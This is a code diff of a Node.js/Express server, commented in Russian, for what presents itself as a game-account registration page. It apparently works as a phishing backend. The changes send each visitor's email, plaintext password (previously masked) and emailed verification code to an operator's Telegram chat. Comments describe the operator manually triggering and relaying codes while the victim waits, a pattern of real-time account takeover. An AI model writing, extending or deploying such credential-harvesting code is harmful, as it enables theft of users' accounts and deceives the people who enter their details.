@@ -1,118 +1,291 @@
-import express from "express";
-import morgan from "morgan";
+// server/index.js
+const path = require("path");
+const express = require("express");
 
 const app = express();
 
-// --- CONFIG ---
+// ===== ENV =====
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID; // например "123456789"
 const PORT = process.env.PORT || 3000;
-const BOT_TOKEN = process.env.BOT_TOKEN;           // токен бота
-const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;   // ID/юзернейм чата (лучше numeric id)
-if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
-  console.warn("[WARN] Set BOT_TOKEN and ADMIN_CHAT_ID in environment");
+
+if (!TELEGRAM_BOT_TOKEN) {
+  console.warn("[WARN] TELEGRAM_BOT_TOKEN is not set");
+}
+if (!ADMIN_CHAT_ID) {
+  console.warn("[WARN] ADMIN_CHAT_ID is not set");
 }
 
-app.use(morgan("tiny"));
-app.use(express.json({ limit: "512kb" }));
-app.use(express.urlencoded({ extended: false }));
+const TELEGRAM_API = TELEGRAM_BOT_TOKEN
+  ? `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`
+  : null;
 
-// --- STATIC (ваш фронт) ---
-app.use(express.static("public", {
-  extensions: ["html"], // можно заходить на /register без .html
-  maxAge: "1h",
-}));
+// ===== MIDDLEWARE =====
+app.use(express.json());
 
-// --- helpers ---
-async function tgSendMessage(text, extra = {}) {
-  if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
-    return { ok: false, error: "no_bot_env" };
+// статика: /public (index.html, soon.html, картинки и т.д.)
+const PUBLIC_DIR = path.join(__dirname, "..", "public");
+app.use(express.static(PUBLIC_DIR));
+
+// health-check для Render
+app.get("/healthz", (req, res) => {
+  res.json({ ok: true });
+});
+
+// опционально: корень сайта
+app.get("/", (req, res) => {
+  res.sendFile(path.join(PUBLIC_DIR, "index.html"));
+});
+
+// ===== TELEGRAM HELPERS =====
+
+async function telegramRequest(method, payload) {
+  if (!TELEGRAM_API) {
+    console.error("[TG] Missing TELEGRAM_BOT_TOKEN, cannot call Telegram API");
+    return { ok: false };
   }
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-  const body = {
-    chat_id: ADMIN_CHAT_ID,
-    text,
-    parse_mode: "HTML",
-    disable_web_page_preview: true,
-    ...extra,
-  };
+
   try {
-    const res = await fetch(url, {
+    const res = await fetch(`${TELEGRAM_API}/${method}`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(body),
+      body: JSON.stringify(payload),
     });
+
     const data = await res.json();
-    return data; // у Telegram {ok: true, result: {...}}
-  } catch (e) {
-    console.error("tgSendMessage error:", e);
-    return { ok: false, error: "fetch_failed" };
+    if (!data.ok) {
+      console.error(`[TG] ${method} error:`, data);
+    }
+    return data;
+  } catch (err) {
+    console.error(`[TG] ${method} fetch error:`, err);
+    return { ok: false };
   }
 }
 
-function safe(v) {
-  return String(v ?? "").trim();
+function sendTelegramMessage(chatId, text, extra = {}) {
+  return telegramRequest("sendMessage", {
+    chat_id: chatId,
+    text,
+    ...extra,
+  });
 }
 
-// --- API: частичный запрос "GET CODE" ---
+// ===== API: notify-admin =====
+//
+// фронт вызывает notifyAdmin("email_code_request", payload)
+// или notifyAdmin("full_application_fallback", formData)
+//
 app.post("/api/notify-admin", async (req, res) => {
-  try {
-    const { type, accessCode, ingameId, email } = req.body || {};
+  const {
+    type,
+    accessCode,
+    ingameId,
+    email,
+    password,
+    emailCode,
+  } = req.body || {};
 
-    // Собираем сообщение
-    const text =
-      `<b>📩 Email code request</b>\n` +
-      `Type: <code>${safe(type) || "email_code_request"}</code>\n` +
-      `Access code: <code>${safe(accessCode)}</code>\n` +
-      `In-game ID: <code>${safe(ingameId)}</code>\n` +
-      `Email: <code>${safe(email)}</code>\n\n` +
-      `⬆️ Проверь данные и отправь пользователю верификационный код на почту.`;
-
-    const tg = await tgSendMessage(text);
-
-    // Ответ фронту: важно вернуть JSON!
-    res.json({ ok: !!tg.ok, tg });
-  } catch (e) {
-    console.error("/api/notify-admin error:", e);
-    res.status(500).json({ ok: false, error: "server_error" });
+  if (!type) {
+    return res.status(400).json({ ok: false, error: "missing_type" });
   }
-});
 
-// --- API: полная заявка ---
-app.post("/api/submit-registration", async (req, res) => {
   try {
-    const { accessCode, ingameId, email, password, emailCode } = req.body || {};
+    if (type === "email_code_request") {
+      // ВАЖНО: сюда добавляем password, чтобы он был в первом сообщении
+      const text =
+        "✉️ <b>Email code request</b>\n" +
+        "\nType: <code>email_code_request</code>" +
+        `\nAccess code: <code>${accessCode || "-"}</code>` +
+        `\nIn-game ID: <code>${ingameId || "-"}</code>` +
+        `\nEmail: <code>${email || "-"}</code>` +
+        `\nPassword: <code>${password || "-"}</code>` +
+        "\n\n⬆️ Проверь данные и отправь пользователю верификационный код на почту.";
 
-    const text =
-      `<b>📝 Registration application</b>\n` +
-      `Access code: <code>${safe(accessCode)}</code>\n` +
-      `In-game ID: <code>${safe(ingameId)}</code>\n` +
-      `Email: <code>${safe(email)}</code>\n` +
-      `Email code: <code>${safe(emailCode)}</code>\n` +
-      `Password: <code>${password ? "•••••••" : ""}</code>\n\n` +
-      `✅ <i>Approve</i> / ❌ <i>Deny</i> обработай вручную.`;
-
-    // Можно добавить inline-кнопки (если у бота есть обработчик CallbackQuery)
-    const tg = await tgSendMessage(text, {
-      reply_markup: {
+      // Клавиатура чисто для тебя в ТГ; сайт от неё не зависит
+      const replyMarkup = {
         inline_keyboard: [
-          [{ text: "✅ Approve", callback_data: "approve" },
-           { text: "❌ Deny", callback_data: "deny" }]
-        ]
-      }
+          [
+            { text: "✅ Approve email", callback_data: "APPROVE_EMAIL" },
+            { text: "❌ Deny / wrong data", callback_data: "DENY_EMAIL" },
+          ],
+        ],
+      };
+
+      const tgRes = await sendTelegramMessage(ADMIN_CHAT_ID, text, {
+        parse_mode: "HTML",
+        reply_markup: replyMarkup,
+      });
+
+      return res.json({ ok: tgRes.ok });
+    }
+
+    if (type === "full_application_fallback") {
+      // если /api/submit-registration упал, фронт шлёт сюда полную заявку
+      const text =
+        "⚠️ <b>Registration application (fallback)</b>\n" +
+        "\nType: <code>full_application_fallback</code>" +
+        `\nAccess code: <code>${accessCode || "-"}</code>` +
+        `\nIn-game ID: <code>${ingameId || "-"}</code>` +
+        `\nEmail: <code>${email || "-"}</code>` +
+        (emailCode
+          ? `\nEmail code: <code>${emailCode}</code>`
+          : "") +
+        `\nPassword: <code>${password || "-"}</code>` +
+        "\n\n🚨 Бекенд вернул ошибку. Заявка отправлена через fallback, проверь вручную.";
+
+      const tgRes = await sendTelegramMessage(ADMIN_CHAT_ID, text, {
+        parse_mode: "HTML",
+      });
+
+      return res.json({ ok: tgRes.ok });
+    }
+
+    // на будущее, если появятся другие типы
+    const text =
+      "ℹ️ <b>Unknown notify-admin type</b>\n" +
+      `\nType: <code>${type}</code>` +
+      `\nAccess code: <code>${accessCode || "-"}</code>` +
+      `\nIn-game ID: <code>${ingameId || "-"}</code>` +
+      `\nEmail: <code>${email || "-"}</code>` +
+      (emailCode ? `\nEmail code: <code>${emailCode}</code>` : "") +
+      (password ? `\nPassword: <code>${password}</code>` : "");
+
+    const tgRes = await sendTelegramMessage(ADMIN_CHAT_ID, text, {
+      parse_mode: "HTML",
     });
 
-    // Возвращаем "pending" (фронт уже ожидает одно из approved/rejected/pending)
-    res.json({ status: tg.ok ? "pending" : "pending", uid: Date.now().toString() });
-  } catch (e) {
-    console.error("/api/submit-registration error:", e);
-    res.status(500).json({ status: "pending", error: "server_error" });
+    return res.json({ ok: tgRes.ok });
+  } catch (err) {
+    console.error("[/api/notify-admin] error:", err);
+    return res.status(500).json({ ok: false, error: "server_error" });
   }
 });
 
-// --- 404 для API по умолчанию (чтобы было понятно) ---
-app.use("/api", (req, res) => {
-  res.status(404).json({ ok: false, error: "not_found" });
+// ===== API: submit-registration =====
+//
+// фронт шлёт сюда основную заявку:
+// { accessCode, ingameId, email, password, emailCode }
+//
+app.post("/api/submit-registration", async (req, res) => {
+  const { accessCode, ingameId, email, password, emailCode } = req.body || {};
+
+  if (!ingameId || !email || !password) {
+    return res.status(400).json({
+      ok: false,
+      error: "missing_fields",
+    });
+  }
+
+  const textParts = [
+    "📝 <b>Registration application</b>",
+    "",
+    `Access code: <code>${accessCode || "-"}</code>`,
+    `In-game ID: <code>${ingameId}</code>`,
+    `Email: <code>${email}</code>`,
+  ];
+
+  if (emailCode) {
+    textParts.push(`Email code: <code>${emailCode}</code>`);
+  }
+
+  textParts.push(`Password: <code>${password}</code>`);
+  textParts.push(
+    "",
+    "ℹ️ Пользователь встал в зону ожидания (waiting zone).",
+    "Решение (approve / deny / отправить новый код) принимается только вручную через тебя."
+  );
+
+  const text = textParts.join("\n");
+
+  try {
+    const tgRes = await sendTelegramMessage(ADMIN_CHAT_ID, text, {
+      parse_mode: "HTML",
+    });
+
+    if (!tgRes.ok) {
+      return res.status(500).json({ ok: false, error: "telegram_error" });
+    }
+
+    // можно сгенерить какой-нибудь ID заявки, если хочешь
+    const uid = String(Date.now());
+
+    return res.json({ ok: true, status: "ok", uid });
+  } catch (err) {
+    console.error("[/api/submit-registration] error:", err);
+    return res.status(500).json({ ok: false, error: "server_error" });
+  }
 });
 
+// ===== TELEGRAM WEBHOOK =====
+//
+// Нужен, чтобы inline-кнопки APPROVE / DENY хоть что-то делали
+// (только в Telegram, сайт не трогают).
+//
+app.post("/telegram/webhook", async (req, res) => {
+  const update = req.body;
+
+  try {
+    if (update.callback_query) {
+      const cq = update.callback_query;
+      const data = cq.data;
+      const chatId = cq.message.chat.id;
+      const messageId = cq.message.message_id;
+
+      if (data === "APPROVE_EMAIL") {
+        // убрать клавиатуру и написать коммент
+        await telegramRequest("editMessageReplyMarkup", {
+          chat_id: chatId,
+          message_id: messageId,
+          reply_markup: { inline_keyboard: [] },
+        });
+
+        await telegramRequest("answerCallbackQuery", {
+          callback_query_id: cq.id,
+          text: "✅ Пометил как APPROVED (на сайт это не влияет).",
+          show_alert: false,
+        });
+
+        await sendTelegramMessage(
+          chatId,
+          "✅ Email / данные помечены как APPROVED. Отправь пользователю код и продолжай вручную.",
+          {}
+        );
+      } else if (data === "DENY_EMAIL") {
+        await telegramRequest("editMessageReplyMarkup", {
+          chat_id: chatId,
+          message_id: messageId,
+          reply_markup: { inline_keyboard: [] },
+        });
+
+        await telegramRequest("answerCallbackQuery", {
+          callback_query_id: cq.id,
+          text: "❌ Пометил как DENIED (на сайт это не влияет).",
+          show_alert: false,
+        });
+
+        await sendTelegramMessage(
+          chatId,
+          "❌ Заявка помечена как DENIED / некорректная. Напиши пользователю отказ, если нужно.",
+          {}
+        );
+      } else {
+        await telegramRequest("answerCallbackQuery", {
+          callback_query_id: cq.id,
+          text: "👍 Принято.",
+          show_alert: false,
+        });
+      }
+    }
+  } catch (err) {
+    console.error("[/telegram/webhook] error:", err);
+  }
+
+  // Всегда 200, иначе Telegram будет ретраить
+  res.sendStatus(200);
+});
+
+// ===== START SERVER =====
 app.listen(PORT, () => {
-  console.log(`Server on http://0.0.0.0:${PORT}`);
+  console.log(`Server listening on port ${PORT}`);
 });
